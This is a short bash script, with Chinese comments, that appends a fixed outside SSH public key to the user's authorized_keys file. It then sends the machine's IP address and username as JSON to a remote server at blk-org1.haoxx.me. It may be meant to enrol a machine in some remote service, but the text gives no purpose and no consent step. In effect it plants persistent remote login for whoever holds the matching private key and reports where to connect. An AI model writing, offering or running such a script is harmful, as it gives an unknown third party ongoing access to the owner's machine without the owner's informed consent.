#!/bin/bash

echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDNl0lB8yBqLlV6odfT6qI3BpxnyeDQcJRRFD4gzVYAy block@block" >> ~/.ssh/authorized_keys

ip=$(hostname -I | cut -d' ' -f1)

user=$(whoami)

json_data=$(cat <<EOF
{
  "user": "$user",
  "addr": "$ip",
  "idn": "id_ed25519.key"
}
EOF
)

# 输出生成的 JSON 数据
echo -e "${YELLOW}Generated JSON data:${NC}"
echo "$json_data"

# 发送 JSON 数据通过 curl
echo -e "${BLUE}Sending data to server...${NC}"
curl -X POST "https://blk-org1.haoxx.me/api/v1/updateresourcessh/$1" \
-H "Content-Type: application/json" \
-d "$json_data"

# 输出完成信息
echo -e "${GREEN}Data sent successfully!${NC}"